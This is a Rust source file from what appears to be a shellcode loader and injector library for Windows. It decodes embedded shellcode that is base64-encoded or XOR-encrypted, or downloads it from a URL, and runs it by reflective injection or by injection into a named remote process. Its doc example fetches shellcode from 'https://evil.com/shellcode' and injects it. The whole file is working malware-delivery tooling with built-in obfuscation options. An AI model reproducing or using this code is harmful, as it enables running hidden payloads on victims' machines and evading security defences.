pub mod injectors;
use injectors::{
    decode_b64_shellcode, decrypt_xor, download_shellcode, reflective_inject, remote_inject,
    InjectionType::{self, Reflect, Remote},
    Injector,
    InjectorType::{self, Base64Embedded, Base64Url, Embedded, Url, XorEmbedded, XorUrl},
};

///
/// Creates an [Injector] to store our shellcode at runtime.
///
/// ```
/// use bolus::{
///     load,
///     inject,
///     injectors::{
///         InjectionType,
///         Injector,
///         InjectorType
///     }
/// };
/// let injection_type = InjectionType::Reflect;
/// let injector_type = InjectorType::Url("https://evil.com/shellcode".to_string());
/// let injector: Injector = load(injector_type).unwrap();
/// inject(injector, injection_type, false).unwrap();
/// ```
///
pub fn load(injector_type: InjectorType) -> Result<Injector, String> {
    match injector_type {
        Embedded(shellcode) => Ok(Injector { shellcode }),
        Base64Embedded((sc_string, b64_iterations)) => {
            let sc_bytes = sc_string.as_bytes().to_vec();
            Ok(Injector {
                shellcode: decode_b64_shellcode(&sc_bytes, b64_iterations)?,
            })
        }
        Url(url, ignore_ssl) => Ok(Injector {
            shellcode: download_shellcode(&url, ignore_ssl)?,
        }),
        Base64Url((url, ignore_ssl, b64_iterations)) => {
            let b64_shellcode: Vec<u8> = download_shellcode(&url, ignore_ssl)?;
            Ok(Injector {
                shellcode: decode_b64_shellcode(&b64_shellcode, b64_iterations)?,
            })
        }
        XorEmbedded((sc_bytes, key)) => Ok(Injector {
            shellcode: decrypt_xor(&sc_bytes, &key)?,
        }),
        XorUrl((url, ignore_ssl, key)) => {
            let sc = download_shellcode(&url, ignore_ssl)?;
            Ok(Injector {
                shellcode: decrypt_xor(&sc, &key)?,
            })
        }
    }
}

///
/// Performs the shellcode injection. Strategy is determined by
/// `injection_type`. `wait` determines whether
/// [windows::Windows::Win32::System::Threading::WaitForSingleObject()]
/// will be used. Useful if the app does not have an infinite main loop.
///
pub fn inject(injector: Injector, injection_type: InjectionType, wait: bool) -> Result<(), String> {
    match injection_type {
        Reflect => unsafe { reflective_inject(injector.shellcode, wait) },
        Remote(proc_name) => unsafe { remote_inject(injector.shellcode, wait, &proc_name) },
    }
}
